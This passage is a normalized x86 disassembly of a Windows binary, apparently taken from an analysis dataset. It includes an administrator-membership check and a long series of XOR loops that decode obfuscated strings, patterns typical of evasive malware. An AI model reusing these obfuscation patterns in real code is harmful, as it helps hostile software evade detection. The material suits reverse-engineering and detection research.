lea ecx [ ebx + 0x78 ]
push r--data
call sub_10039b60
test eax eax
je r-xdata
mov edx [ ebx + 0xc8 ]
push 0x4
lea ecx [ ebp - 0xe0 ]
push ecx
push 0x1f
push esi
mov [ ebp - 0xe0 ] 0x3100
call edx
mov eax [ ebp - 0xb8 ]
mov eax [ ebp - 0x98 ]
push eax
call sub_1006591f
add esp 0x4
mov ecx [ ebx + 0xe8 ]
push 0x0
push esi
call ecx
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x4
jmp r-xdata
lea edi [ ebx + 0x94 ]
mov ecx edi
call sub_1001ff30
test al al
je r-xdata
mov edi [ ebp - 0xd8 ]
mov eax [ ebx + 0xd8 ]
push 0x0
lea edx [ ebp - 0xdc ]
push edx
push edi
push 0x0
push 0x20000013
push esi
mov [ ebp - 0xdc ] 0x4
call eax
test eax eax
jne r-xdata
mov [ ebp - 0xb8 ] 0x5
jmp r-xdata
mov ecx 0x8
cmp [ edi + 0x14 ] ecx
jb r-xdata
cmp [ edi ] 0x12e
je r-xdata
mov [ ebp - 0xb8 ] 0x6
jmp r-xdata
cmp [ ebx + 0x8c ] ecx
lea eax [ ebx + 0x78 ]
jb r-xdata
mov edi [ edi ]
mov edi [ ebp - 0xc0 ]
push esi
mov esi [ ebp - 0xd0 ]
call sub_100247c0
mov esi [ ebp - 0xbc ]
mov [ ebp - 0xb8 ] eax
push 0x0
push edi
push eax
mov eax [ ebx + 0xcc ]
push 0x1
push 0x1
push esi
call eax
test eax eax
jne r-xdata
mov eax [ eax ]
mov [ ebp - 0xb8 ] 0x3
jmp r-xdata
sub_1002ca50
push ebp
mov ebp esp
sub esp 0x14
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
xor ebx ebx
lea eax [ ebp - 0x10 ]
push eax
push ebx
push ebx
push ebx
push ebx
push ebx
push ebx
push 0x220
push 0x20
push 0x2
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x8 ] 0x500
mov [ ebp - 0x10 ] ebx
call [ AllocateAndInitializeSid@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0x14 ]
push edx
push eax
push ebx
call [ CheckTokenMembership@IAT ]
test eax eax
je r-xdata
xor eax eax
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10024145
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
cmp eax ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x14 ]
xor ecx ebp
pop ebx
call sub_10024145
mov esp ebp
pop ebp
retn
push eax
call [ FreeSid@IAT ]
sub_1002caf0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_10004749
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_1002cb20
push 0x14
mov eax sub_1007f62c
call sub_100097c8
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100014b7
mov esi [ rw-data ]
and [ ebp - 0x4 ] 0x0
mov ecx rw-data
mov [ ebp - 0x10 ] esi
call sub_10015f10
mov ecx [ ebp + 0x8 ]
push eax
call sub_10065660
mov edi eax
test edi edi
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
lea ecx [ ebp - 0x14 ]
call sub_10050f50
mov eax edi
call sub_1004db01
retn
test esi esi
je r-xdata
push [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call sub_10007fa4
pop ecx
pop ecx
cmp eax 0xffffffff
jne r-xdata
mov edi esi
jmp r-xdata
mov edi [ ebp - 0x10 ]
mov ecx edi
mov [ rw-data ] edi
call sub_10030d90
push edi
call sub_1004d80c
pop ecx
push r--data
lea ecx [ ebp - 0x20 ]
call sub_1005457d
push r--data
lea eax [ ebp - 0x20 ]
push eax
call sub_1000bd19
sub_1002cbc0
push ebp
mov ebp esp
sub esp 0x10
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push 0x58
push ebx
call sub_10020380
mov esi [ ebp + 0xc ]
mov edi eax
mov ecx 0x16
[ edi ] [ esi ]
mov ecx [ eax + 0xc ]
and ecx 0xfffffffd
or ecx [ ebp + 0x10 ]
lea esi [ eax + 0x10 ]
push esi
or ecx 0x1
push 0x1
xor edi edi
push ebx
mov [ ebp - 0x4 ] eax
mov [ eax + 0x4 ] edi
mov [ eax + 0x8 ] 0xffffffff
mov [ eax + 0xc ] ecx
call sub_100268a0
lea eax [ esi + 0x3c ]
mov esi [ ebp + 0xc ]
mov edx [ esi + 0x50 ]
push eax
push edx
push ebx
mov [ ebp - 0x10 ] eax
call sub_100268a0
add esp 0x20
mov [ ebp + 0x10 ] edi
cmp [ esi + 0x50 ] edi
jbe r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ esi + 0x4c ]
mov ecx [ ebp + 0x10 ]
mov esi [ eax + ecx * 4 ]
push 0x4c
push ebx
mov [ ebp - 0x8 ] esi
call sub_10020380
mov edi eax
mov ecx 0x13
[ edi ] [ esi ]
mov edi [ ebp - 0x8 ]
mov edx [ edi + 0x4 ]
push edx
push ebx
mov [ ebp - 0xc ] eax
call sub_1000ad70
mov esi [ ebp - 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x10 ]
push eax
push ebx
call sub_1000ad70
mov ecx [ ebp - 0x10 ]
push ecx
push esi
push ebx
mov [ esi + 0x10 ] eax
call sub_100049a0
mov eax [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
inc eax
add esp 0x24
mov [ ebp + 0x10 ] eax
cmp eax [ edx + 0x50 ]
jb r-xdata
mov esi edx
sub_1002cc99
mov edi edi
push ebp
mov ebp esp
xor eax eax
mov eax [ eax * 8 + r--data ]
pop ebp
retn
inc eax
cmp eax 0x16
jb r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ eax * 8 + r--data ]
je r-xdata
xor eax eax
pop ebp
retn
sub_1002ccbf
push 0x8
push r--data
call sub_10079bf0
xor esi esi
cmp [ rw-data ] esi
jne r-xdata
call sub_10079c35
retn
push 0x6
call sub_10043f7b
pop ecx
mov [ ebp - 0x4 ] esi
cmp [ rw-data ] esi
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002cd05
call sub_1007e9e6
inc [ rw-data ]
sub_1002cd10
push ebp
mov ebp esp
push 0xffffffff
push sub_10081ce9
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ ebp + 0x8 ]
mov [ ebp - 0x10 ] 0x0
xor eax eax
mov [ esi + 0x14 ] 0x7
mov [ esi + 0x10 ] 0x0
mov [ esi ] ax
mov ecx [ ebp + 0xc ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov edx [ ecx + 0x10 ]
mov [ ebp - 0x10 ] 0x1
lea edi [ eax + 0x2 ]
jmp r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edi
mov edi [ esi + 0x10 ]
sar eax 0x1
add eax edx
cmp edi eax
ja r-xdata
mov eax [ ebp + 0xc ]
push 0xffffffff
push 0x0
push eax
mov ecx esi
call sub_10043930
mov edi [ ebp + 0x10 ]
mov eax edi
lea edx [ eax + 0x2 ]
cmp [ esi + 0x14 ] eax
je r-xdata
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
sub eax edx
sar eax 0x1
push eax
push edi
mov ecx esi
call sub_10025720
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
push 0x1
push eax
mov ecx esi
call sub_10003d30
test al al
je r-xdata
cmp [ esi + 0x14 ] 0x8
mov [ esi + 0x10 ] edi
jb r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
xor edx edx
mov [ eax + edi * 2 ] dx
sub_1002ce00
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ecx + 0x14 ]
test eax eax
je r-xdata
lea edx [ ebp - 0x30 ]
mov eax 0x77
cmp eax 0x4
je r-xdata
xor eax eax
mov [ eax ] 0x0
jmp r-xdata
mov eax [ ecx + 0x30 ]
mov [ esi ] eax
mov eax [ ecx + 0x34 ]
jmp r-xdata
lea edx [ ebp - 0x28 ]
mov eax 0x76
jmp r-xdata
mov ecx [ ebp - 0x4 ]
mov [ esi + 0x4 ] eax
inc [ eax ]
xor ecx ebp
mov eax esi
call sub_10024145
mov esp ebp
pop ebp
retn
call sub_100050e0
push 0x4
push 0x0
mov [ esi ] 0x0
mov [ esi + 0x4 ] 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapAlloc@IAT ]
test eax eax
je r-xdata
sub_1002ce80
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_100796a0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_1002ceb0
push ebp
mov ebp esp
push esi
mov esi ecx
push esi
call sub_10042de0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1006591f
add esp 0x4
sub_1002cee0
push ebp
mov ebp esp
push 0xffffffff
push sub_10081546
mov eax [ fs : 0x0 ]
push eax
sub esp 0x19c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi [ r--data ]
mov edi ecx
xor ebx ebx
xor cl cl
xor eax eax
lea esp [ esp ]
mov dl [ esi + eax ]
xor dl cl
xor dl 0x97
inc cl
mov [ ebp + eax - 0xb8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb8 ]
mov [ ebp - 0xb2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea edx [ ebp - 0x154 ]
lea ecx [ edi + 0xf0 ]
push edx
mov [ ebp - 0x4 ] ebx
mov [ ebp - 0x174 ] ecx
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov eax [ ebp - 0x154 ]
push eax
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xcb
inc cl
mov [ ebp + eax - 0x70 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x70 ]
mov [ ebp - 0x6b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x70 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x1
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x24
inc cl
mov [ ebp + eax - 0xc8 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc8 ]
mov [ ebp - 0xc2 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x2
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xdb
inc cl
mov [ ebp + eax - 0x80 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x80 ]
mov [ ebp - 0x7b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x80 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x3
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xe5
inc cl
mov [ ebp + eax - 0x48 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x48 ]
mov [ ebp - 0x43 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x48 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x4
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x32
inc cl
mov [ ebp + eax - 0x60 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x60 ]
mov [ ebp - 0x5b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x5
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x89
inc cl
mov [ ebp + eax - 0xf0 ] dl
movzx eax cl
cmp eax 0x7
jb r-xdata
lea eax [ ebp - 0xf0 ]
mov [ ebp - 0xe9 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x6
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x49
inc cl
mov [ ebp + eax - 0x78 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x78 ]
mov [ ebp - 0x73 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x78 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x7
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x2c
inc cl
mov [ ebp + eax - 0x28 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x28 ]
mov [ ebp - 0x24 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x28 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x8
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x8b
inc cl
mov [ ebp + eax - 0xb0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xb0 ]
mov [ ebp - 0xaa ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xb0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x9
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x59
inc cl
mov [ ebp + eax - 0x50 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x50 ]
mov [ ebp - 0x4b ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x50 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xa
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x66
inc cl
mov [ ebp + eax - 0x58 ] dl
movzx eax cl
cmp eax 0x5
jb r-xdata
lea eax [ ebp - 0x58 ]
mov [ ebp - 0x53 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x58 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xb
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xe7
inc cl
mov [ ebp + eax - 0xc0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
lea eax [ ebp - 0xc0 ]
mov [ ebp - 0xba ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xc0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xc
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xa5
inc cl
mov [ ebp + eax - 0x17c ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x17c ]
mov [ ebp - 0x17a ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x17c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xd
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x4c
inc cl
mov [ ebp + eax - 0x18 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x18 ]
mov [ ebp - 0x14 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0xe
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xcb
inc cl
mov [ ebp + eax - 0xd0 ] dl
movzx eax cl
cmp eax 0x6
jb r-xdata
mov esi 0xf
lea eax [ ebp - 0xd0 ]
mov [ ebp - 0xca ] bl
mov [ ebp - 0x140 ] esi
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
nop
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] esi
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
lea ebx [ ebx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x52
inc cl
mov [ ebp + eax - 0x20 ] dl
movzx eax cl
cmp eax 0x4
jb r-xdata
lea eax [ ebp - 0x20 ]
mov [ ebp - 0x1c ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x20 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov esi 0x10
mov [ ebp - 0x4 ] esi
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] esi
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0x73
inc cl
mov [ ebp + eax - 0x190 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x190 ]
mov [ ebp - 0x18e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x190 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x11
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ eax + esi ]
xor dl cl
xor dl 0x7d
inc cl
mov [ ebp + eax - 0x180 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x180 ]
mov [ ebp - 0x17e ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x180 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x12
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd0
inc cl
mov [ ebp + eax - 0x188 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x188 ]
mov [ ebp - 0x186 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
mov edi edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x188 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_10043190
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx [ ebp - 0x174 ]
mov [ ebp - 0x4 ] 0x13
call sub_1000dd20
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
mov esi [ r--data ]
xor cl cl
xor eax eax
mov edi edi
mov edx [ ebp - 0x154 ]
push edx
call sub_1006591f
add esp 0x4
mov dl [ esi + eax ]
xor dl cl
xor dl 0xd9
inc cl
mov [ ebp + eax - 0x184 ] dl
movzx eax cl
cmp eax 0x2
jb r-xdata
lea eax [ ebp - 0x184 ]
mov [ ebp - 0x182 ] bl
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
